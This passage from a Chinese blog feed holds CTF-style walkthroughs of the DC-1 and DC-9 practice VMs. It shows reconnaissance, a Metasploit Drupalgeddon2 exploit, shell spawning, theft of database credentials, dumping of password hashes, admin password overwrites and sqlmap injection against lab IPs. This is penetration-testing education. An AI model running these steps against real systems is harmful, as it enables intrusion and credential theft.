-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Y2FiOTE0ZDZiOWQwZjBhMGFlYTljMmYzNTA0NzAyZTJfQU1Ya3dVeE9XSGZ3cHZDdTUxTUVjTjNJeTB4Q3R3MWxfVG9rZW46UzEyTGJyZVg5b3E4UWx4WXhoVGNJYnlCbk5kXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>解压完成直接使用虚拟机打开</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzNmYmZmOGEwZGY5ZjY3NTdiNDU5Mzc2YmQ0OGY0ZDBfS1U5QnozaWtzcElWaUxtdWpsWEV4NHprRWpWSnczT0VfVG9rZW46RWt5c2J4QUxNb3NsOG14NFAzRWM2ankzbmVmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>提示导入失败，不过没有关系点重试就好，导入完成后，打开DC-1虚拟机并等待，过程中别点进虚拟机里面</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY1ZjcwYjUyNjUwZDM3MjRkZjM1YjlkZGNlYTc4MjBfbWVGY0NFeWVXSVY0dDBrSlZ3cHpHTTdpeVBHN21QRFFfVG9rZW46VTVZM2I1bk5Jb3ZMd2l4UEsybGNsTjljbmhoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>出现这个界面就表示开启成功 （渗透完得到密码就能登入啦）</p>
-<h4 id="注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https-zhuanlan-zhihu-com-p-65103100）"><a href="#注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https-zhuanlan-zhihu-com-p-65103100）" class="headerlink" title="注意！！！！靶机和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（https://zhuanlan.zhihu.com/p/65103100）"></a>注意！！！！<a href="https://so.csdn.net/so/search?q=%E9%9D%B6%E6%9C%BA&spm=1001.2101.3001.7020">靶机</a>和kali的接入模式必须要一致，比如都用net或者都用桥接，不懂的可以看这个（<a href="https://zhuanlan.zhihu.com/p/65103100%EF%BC%89">https://zhuanlan.zhihu.com/p/65103100）</a></h4><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmVlMjM1YWI5NjJkOGE3NDYwNjA0MmYyMDRiYzI4YWNfc2dwNGRrU2Y0Ylh3N2VPR25Va3BOd21NN2ZSZ1EwMkZfVG9rZW46RTBaUGJ6TlE5b2M0alp4bjhnNGNXYnFvblNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1></li>
-</ol>
-<p>这个过程需要用到kali，打开kali</p>
-<ol>
-<li><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2></li>
-</ol>
-<h3 id="①探测主机ip"><a href="#①探测主机ip" class="headerlink" title="①探测主机ip"></a>①探测主机ip</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ODQzNDYyNGM3ODczZjkyZGMzY2JhMzAzMTY3NDE4YjJfcTZKUG5aWnZ6ZU9PUHo0cjFyMWY4S2hYcGExdkpFY3hfVG9rZW46SmNXc2J4NHZIb2pJZlp4ZW9yWmNuakNJbmplXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<h3 id="②探测目标ip开放端口"><a href="#②探测目标ip开放端口" class="headerlink" title="②探测目标ip开放端口"></a>②探测目标ip开放端口</h3><p>用nmap来探测</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY1MDJlOTVmYmM4YmIwMjNlY2QwOWFjMWMwYzliZWRfSnNyQVhmYk84M3BBdk5jdXZ4M05xY2g5Rk56UHVDVUlfVG9rZW46TFVFQWJJTkNZb0prelV4UElsSmNOUVgxbkxmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>进行端口的扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Nmap -P</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzM5NmM0M2E0YzY0YmNlNzMyYThlNjRjODIzYjdmNGJfTERsTkUyTlJaTWt3bW9hU2FyTXZ4UG9HQ3NyZ21LTjNfVG9rZW46R3BYM2I1bHdib0FDY3p4SncxTGNZSFg3bkJoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<h5 id="③收集网页信息"><a href="#③收集网页信息" class="headerlink" title="③收集网页信息"></a>③收集网页信息</h5><p>浏览器输入地址</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTA0YjAwODMyYTVlMDQwYzcwZjY2N2YwYjE2ODNjMDJfamN2Smpya3hiTDlKZXFlNExBbUVqM1AxVGdERkY0ZXJfVG9rZW46U3d4cmJBREZ1b3ZZQ0t4TmliS2NlajF3bnBlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>利用火绒插件<strong>wappalyzer</strong>，查看站点信息，也可以自己判断，网页一看cms就是drupal</p>
-<h5 id="什么是cms？"><a href="#什么是cms？" class="headerlink" title="什么是cms？"></a>什么是cms？</h5><blockquote>
-<p>CMS是”Content Management System”的缩写，意为”内容管理系统”。 它采用统一的信息组织的方法即分类，对同一类型的信息进行分类，且每一类信息都可以进行新建（Add）、查看（View）、编辑（Edit）和删除（Delete）四种不同的操作。除了使用分类的方式组织信息以外，又采用了统一的用户和权限管理对信息的使用进行控制，即构成了一个完整的信息组织和管理的体系。内容管理系统是企业信息化建设和电子政务的新宠，也是一个相对较新的市场.</p>
-</blockquote>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=Yzg4ZjhmNjMzYmVkNTM2YjUzYTFjNjZiZDM0YmY0NWVfZ1hYSVFFUEh6cmdZUE5JTjlZOGVTSk1meGxYRkhQRnpfVG9rZW46SUVtZGJrVzZxb0IyYXp4cEVjZWNQSlRZbklrXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h2 id="漏洞查找与利用"><a href="#漏洞查找与利用" class="headerlink" title="漏洞查找与利用"></a>漏洞查找与利用</h2></li>
-</ol>
-<p>什么是Drupal</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTljNzEzZDY2ZGIzNjVjZjE0NTFjNGRhMDI3ZmYzNTRfZkdCZDE5OWRXd1daQWdZYmxHc2l5MUJKZnlyRlczbnNfVG9rZW46UkwyUWJKZnRwb1VGdHZ4VG12NGNnTTQ5bkppXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>知道cms，我们一般从cms出发找漏洞，百度一下drupal漏洞</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YzlmOTVjNGFiZTc4MzE1MDEyOWU4YzRhMTgwYTRjNDNfV2pVVXZMamgyNnlzVFpRTTY3N0pReW5qd283WEw3TDRfVG9rZW46SzNYQWJOVGphbzZwcDR4T2VhZmN4WDl2bllkXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>或者在工具中打开</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzhhOTBhOGM2MTA5MTc1MzgyODZjNTY1ZWY4MmIxNDRfSGVSMFFkdFNWanhGSXptNTdjTnFiRndiUUZQclFQYm9fVG9rZW46SVFFdWJyZk05bzVCdWl4ZXhHdGNDRU1XbkpiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>代开之后在里面搜索drupal</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NTQwZWNjZjZhNTQwZDQwNDE4MWUxNTkwZDhjYzIyNTJfZEo3N0tjelA5UlM4MGl5QmRzb1gyQzFDRXRjcXFtQVFfVG9rZW46QTNvZGI3ak5qbzRONnZ4NzQyVGMxelVrbnBjXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>这里是drupal的漏洞</p>
-<h3 id="①漏洞查找"><a href="#①漏洞查找" class="headerlink" title="①漏洞查找"></a>①漏洞查找</h3><p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjZiM2M3OThiYjcxMTI5MTkxMDkxZWRmNTY3ZWM1YWVfalJOa1ZnaEJMdW5HNGZoN2FreXNRb1owSVNHcmpyVmNfVG9rZW46VkFvQmJ3aWFKb0J5Q2x4Z1dQZ2Nkb0V2bkNmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>用工具Metasploit（目前世界上领先的<a href="https://so.csdn.net/so/search?q=%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95&spm=1001.2101.3001.7020">渗透测试</a>工具，也是信息安全与渗透测试领域最大的开源项目之一），找一下漏洞，先打开工具</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">metasploit</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzgzM2I4ZDRlOGI4OGY1YzEyOWMyMDQ4Njc3NTNlZGZfSHNlOEZHMWxYdERoU2JPVnlhYmdUQlhmZXlXNHhuUWhfVG9rZW46RGZDRmJaNnJZb0RKTXZ4SUxnMWMxcGFPbjFnXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>然后输入命令</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search Drupal</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjUwODgwMWFlNmExNzBiMzcwNjE5YzFhN2I2N2EzMmNfYVp0N25KSDVKQVZseDJYdG1ORzFHRXRIU1MxNGp6bUlfVG9rZW46Q3Q5UGJGajNPb1NPaW54Mnh0d2NrR0p1bnpkXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>这些就是Drupal的漏洞，可以看到漏洞还挺多的</p>
-<p>在这里面使用 1  exploit&#x2F;unix&#x2F;webapp&#x2F;drupal_drupalgeddon2       2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection  这个脚本</p>
-<p>输入：<code>use 1</code></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MTI4YjQ5YThjYmU0YmE2NjA0NTBjMjE3OWNiOTA1MmRfenpmZXU2MUg1eGdJMmh3a3JLd051UnJxV0htVlV5UU9fVG9rZW46UjVaRmJuNmpEb3U0bGR4OVJ0UmNtaWNNbjRiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>接着看一下该漏洞模块参数</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show options</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTVlMTY3NDlhMmFlOGY1ZmFiNjkxYzc5YjY3MzM2YTZfcURnM0VncmpRR1VyS20zVmhKR0lPUHRDZTBvY0ZuSlpfVG9rZW46SlE4bWJQMllZb0FrU1F4WmxWd2M3RWpjbmVoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<blockquote>
-<p>Current Setting是目前设置的内容 Required表示是否需要设置内容，yes为必须设置，no可以设置也可不设置 就上面来说RHOSTS需要set，但是没有内容</p>
-</blockquote>
-<p>所以接着我们来设置一下RHOSTS内容（就是攻击目标IP地址，靶场地址）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set RHOSTS 192.168.217.18</span><br></pre></td></tr></table></figure>
-
-<p>然后再show一下模块参数</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OWE3MjBjZjUyNDljMDhhNGVjN2ZiZjNhMGQwZTFhOGVfUWNFOWhtcnlVVFlCdFZic0I0anF5WDhRdjlIMmo0STRfVG9rZW46SHJpSWJyUkVpbzhVNDZ4T1M3bWNVTlhUbnlmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>设置好参数后开始攻击</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exploit</span><br></pre></td></tr></table></figure>
-
-<p>exploit和run是一样的，用run也可以</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTA4MzU1ZWVlODk2NmExNGRjYTQ3NmVkODZkNWU1NGJfNFdQTEhQRFRBUFl4SVR0VXhPeGc5TnN4c3BRVkVNVFNfVG9rZW46VmNHNGJCRjZFb1ZVRGN4cXNva2NJVjVlbmdoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>出现Meterpreter session 1 opened（kali和目标ip的连接）就说明攻击成功啦，接下来我们可以直接上shell</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YmIzYTQ5ZjYwYmIwNTViZDA3MDFlOTNmNjg2MzU3YmRfaE9VT1RvSnpMZERYTWRlT3RZclBHdnU2ek83UW94YzdfVG9rZW46UzdqUGJ3YkZPb1JvVnF4YklYUGN5QUZZblM2XzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2></li>
-</ol>
-<h3 id="①获取普通shell"><a href="#①获取普通shell" class="headerlink" title="①获取普通shell"></a>①获取普通shell</h3><p>然后执行ls命令</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWQzY2ZhNjcwMWVkYzlkY2UyOTg3ZTBmN2YxZjVmNWFfbkU2RnBtZnVjMWNtRkdzU3VQVHhPU0hGa1liYnhFR2JfVG9rZW46U3NQVGIwQ1dabzRIVDN4c2kwbmM5OUl2bjFmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<h3 id="②获取交互shell"><a href="#②获取交互shell" class="headerlink" title="②获取交互shell"></a>②获取交互shell</h3><p>这样看起来有点费劲，不过我们可以利用python实现互交shell，这样就好看一点，使用的前提是攻击主机上必须装有python</p>
-<p>“我不会安装python”</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
-
-<p>这是一个固定姿势，直接复制就能用</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTlkMTRkNWM3MTIzNDgyNGViZWRkZDU3ZDE3M2Q5YTdfTnBnb1RjSWRXcHJhOWowUXc0OXpNWVBJb1lSS1dKYVNfVG9rZW46T0VyTmJPNUFpb2szeVR4WEZ6amNINURGbmNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>可以看到这个shell的权限只是普通权限，还不是root，不过还能看看文件啦，先看一下发现的flag1.txt文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OGZhNzJiYmJhZjMzMGU0MTZkMzNmYTQzMjM4NmE1N2ZfRDloODRWRjJ3OVlSY2FTcW5Xc2VVa0RKSTI5NlUxQkpfVG9rZW46SlhqOWJ6Mjdqb0p6QVZ4TmJqTGNMbmxjblZnXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>翻译过来就是：每个好的CMS都需要一个配置文件，你也一样，emmm，这个先放着，看看还有没有其他flag文件</p>
-<p>我们再看看有没有其他flag文件 <code>find / -name flag*</code></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmUxZjBhMjIwOWNkMDM2MzUwMGNkZmQ5ZTczOWZlZDFfUjUwMUI0bWljVU9QaGNyUkV1TmNqU3A3SFhQOEU4RjNfVG9rZW46RllPUWJkZUc5b25QQlN4VXlJN2M4Y29vblNmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>好吧只有一个，我们再看看他的配置文件，一般来说配置文件都有一些特别重要的信息在里面，搞不好还能提权，百度Drupal配置文件（每一个好的CMS都需要一个配置文件）</p>
-<p>下一个攻克点提示在配置文件中</p>
-<p>百度找到的durpal的配置文件是 &#x2F;vsr&#x2F;www&#x2F;sites&#x2F;default&#x2F;settings.php</p>
-<p>进入durpal配置文件</p>
-<p>逐层解剖 找到flag2文件 进行读取</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmQ1ZWFhNDFjNzlmMjk1NWNkNzdmZmNjOWY4NWNhMWRfY3FRaFRYVzlDMElVcnlHanlCOWxzakE2d1pKMlBrODlfVG9rZW46U0V2bWJFZGkyb0lIYmx4NElBb2NGY0p0bmtiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MzFiMzZiMjUyODY2Y2UwYmI3YjY5N2YyNTA0NjczNDBfdUx4VEJWU2ZSUWlyanFwU0liakptaUtSVjBXcTBodElfVG9rZW46VHFZa2I1Vzg4b2haZDJ4WEFkOGNweXpYbndFXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<ol>
-<li><h2 id="数据库渗透"><a href="#数据库渗透" class="headerlink" title="数据库渗透"></a>数据库渗透</h2></li>
-</ol>
-<p>发现第二个flag以及数据可以账号密码、咱们登录一下</p>
-<p><code>mysql -udbuser -pR0ck3t</code>  mysql -u dbuser -p </p>
-<p>mysql -u dbuser -p </p>
-<p>Enter password: R0ck3t</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YTVjYThhM2M0YmM1ZTJiOTViMjk0OTZmMzQxZjdjZWNfTmJDNlJLdUR6SUFQWkdtSXNtb1VUanFGZW4zMDJPc0lfVG9rZW46SXVkQ2JVNHIxbzJ1TWd4Y01namM4d0FwbjF5XzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>登进去了，这样我们就可以为所欲为修改数据库了，先看看有啥好东西</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show databases;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NWI3NDJmM2Q3NWVjOWZlN2E1Mjg4NGU3NGVlYzJkNzRfMzZsYkhWVkpGUGZCUnJ1ODVxbmdhTzNRMlFBYW9PbWRfVG9rZW46UTB3Y2J2S1Exb0M1bVF4dkYxR2NLVDZWbmhiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>接着使用该数据库，并查看表 <code>use drupaldb;show tables;</code></p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc4ZGE4MTEwMDUwNTA3OWIyNzI5ZGY1YjUxNTlkZWVfOXFqSzBRWGEyYXV5b05WekNUdHZ4ZWxyU0RJYzNNV3BfVG9rZW46RllLemJUVE11bzRzbEp4WE5ZSWNhbEs1bkVmXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>注意到users这个表，看一下有啥，先改小一点字体，不然可能会挤爆不美观</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users;</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDA1MWNhOGM4NzU4ZjdjZTMxMmNmOGZkMGYyNGZmYjFfYkhuTWo4NXk0bkg4dVl0bFM4cVBvMWprMHNPblA4bnlfVG9rZW46R0tUT2I5dk1qb0F3UmZ4SUdJVmM0UlF2bldDXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>得到两个用户</p>
-<p>1 | admin | S SSDvQI6Y600iNeXRIeEMF94Y6FvN8nujJcEDTCP9nS5.i38jnEKuDR</p>
-<p>2 | Fred | S SSDWGrxef6.D0cwB5Ts.GlnLw15chRRWH2s1R3QBwC0EkvBQ&#x2F;9TCGg</p>
-<p>密码好复杂，应该不是明文，那想登进后台就很难了就很难了，我们可以通过修改admin的密码，或者是新加一个admin</p>
-<p><strong>方法一：修改admin密码</strong></p>
-<p>我们得先找到加密文件，Drupal的加密脚本在</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
-
-<p>首先我推出mysql</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">exit;</span><br></pre></td></tr></table></figure>
-
-<p>打开加密脚本</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/www/scripts/password-hash.sh</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=OGY0YzgyNjcwNDVjYWUxNmFiODk5YTNiZjRmMjJkMjhfYjZzbnc4WFlvb2pENDlyU3lXajJIUHNMSVE3YzlRTVhfVG9rZW46UVFLOGJjQ3Zzb0x2NW54dDdGcWNhYmpLbnNlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>这个脚本是用php写的，而且还能用php加参数运行，直接得到加密后的密码，这里我们设置一个密码123456</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php /var/www/scripts/password-hash.sh 123456</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWYzYTY4ZmM3MWY5ZjUwOTUwOWJjZTkxYzQxNjZjNzNfZWFIenJyZ2dUa0s1a0t6QXpkY1FLTGZoRzJSWlhQbkRfVG9rZW46UHlsWGJ2czl0b3RnMmF4MlA0Z2NkdjRrblRiXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>得到加密后的密码， 接着我们登入mysql修改一下admin跟Fred的密码</p>
-<p>mysql -udbuser -pR0ck3t</p>
-<p>use drupaldb;update users set pass &#x3D; “S SSD1UQvb3x7lKoCSX6S9K.r.wB202Lsa&#x2F;r7fkOj7CelJsSEMFDJjGv” where name &#x3D; ‘admin’ or name &#x3D; ‘Fred’;</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NGJmMDU4NTRkMGQ0ODI3ZGJiYWEzNjliMWVhZmQ4ZGFfdTgyOUFJS2ROWkRrOHpUMUpoR0cwdVlqTjFXcEpCazBfVG9rZW46SE5wMmJZTVdMb0ZMVDV4MWVVQmMyTnZvbnJlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>接着我们用修改好的密码登入</p>
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=ZmNlYzUyMzI0MDY3MzI3MDAxOTA0MDUzMzMxNjUwZWNfVGphTEdkeDdLTHlJc09mTk1tSDFIenYyZmtLT1pQNVdfVG9rZW46QVNJbmJmclNVb3RnVGx4NGtLZGM5WUp3bmdlXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>登进去就找到了flag3，提示了我们一些信息passwd和shadow，明显就是linux的文件</p>
-<p>&#x2F;etc&#x2F;passwd</p>
-<p>该文件存储了系统用户的基本信息，所有用户都可以对其进行文件操作读</p>
-<p>Linux &#x2F;etc&#x2F;passwd内容解释（超详细）</p>
-<p>&#x2F;etc&#x2F;shadow</p>
-<p>该文件存储了系统用户的密码等信息，只有root权限用户才能读取</p>
-<p>Linux &#x2F;etc&#x2F;shadow（影子文件）内容解析（超详细）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tac /etc/passwd</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=MGQyYWUzYzVlOWRmNjM1NDJhZjk1YWU1N2ZlOThiY2JfNkd4ZURwaG1XZGpKblg3ZEVtVU5rbjV2dUdHcjFMRDFfVG9rZW46Qlgzc2IxTUFGb1FNbmt4YklqVmMxcE81bnNoXzE3MTE5MDI3OTA6MTcxMTkwNjM5MF9WNA" alt="img"></p>
-<p>可以看到有flag4这个用户，我们有两个方法拿到这个用户的密码，一个是爆破，另一个就是提权打开shadow文件查看密码</p>
-]]></content>
-      <categories>
-        <category>靶场，DC系列</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>DC-9</title>
-    <url>/2024/04/01/DC-9/</url>
-    <content><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机扫描"><a href="#主机扫描" class="headerlink" title="主机扫描"></a>主机扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YWRhZmQ2NTIwMTEyMzlmMTk5NGNmNjAzNDJkMmExZDJfOGs5UDEwTUFnbmdITlVNamc3dkRHeWVjRDF3aXpDNHhfVG9rZW46VVJNM2I4WVF1b0pHVzZ4c1NFSmMxVE45bjFlXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.217.129/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=YjgxNzc2ZDY4NGRkYjcwZjk3MTcwYjc3YTQ5ZjFjZjRfZDI2YmZJSklxV1M5dURvVE12SEtzQjVJZXdUN2hHSHRfVG9rZW46V3hwMmJQdkpFb0FZZWZ4cVRzQ2M3WkIwbmxoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap 192.168.217.137</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NmJjODRiYTUzZDViNjI2YzA0YjQ4NjA4YmM3OTRiMzZfWHpHcERWcW1ZRWdLUkgwZGxaMlZ3cTNUYXdFdHpJWDZfVG9rZW46QU1vWmJFek1zb0s2aGF4eW1nSWNCZVV5bkRoXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<p>注意到ssh服务端口是filtered的，可能是什么原因给关掉了</p>
-<h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u 192.168.217.137 -e * -x 403 --random-agent</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://y060vbkcbbs.feishu.cn/space/api/box/stream/download/asynccode/?code=NDY2NGViMGQxYTBiZDRjZGZlM2Q3MDlkZDZmMmIyMjVfMU56Vms5R3NmNUZIdFE4N29Ua1NxbUNXSVFSQ2k2OGZfVG9rZW46SDhvR2I5Sm1yb0xRTTR4SURORmNLMU9CbnJnXzE3MTE5MDEyNzA6MTcxMTkwNDg3MF9WNA" alt="img"></p>
-<h2 id="页面探测"><a href="#页面探测" class="headerlink" title="页面探测"></a>页面探测</h2><p>暂时无图</p>
-<p>探测结果：</p>
-<p>发现Search页面搜索存在<a href="https://so.csdn.net/so/search?q=SQL%E6%B3%A8%E5%85%A5&spm=1001.2101.3001.7020">SQL注入</a>（原因：在上传之后网址无任何变动，判断是post请求）</p>
-<h1 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h1><h2 id="SQ注入"><a href="#SQ注入" class="headerlink" title="SQ注入"></a>SQ注入</h2><p>知道注入点，接下来上sqlmap跑，POST传参search，爆库</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;``http://192.168.217.137/results.php``&quot; --level=5 --risk=3 --batch --method=POST --data=&#x27;search=1&#x27; --current-db</span><br></pre></td></tr></table></figure>
-
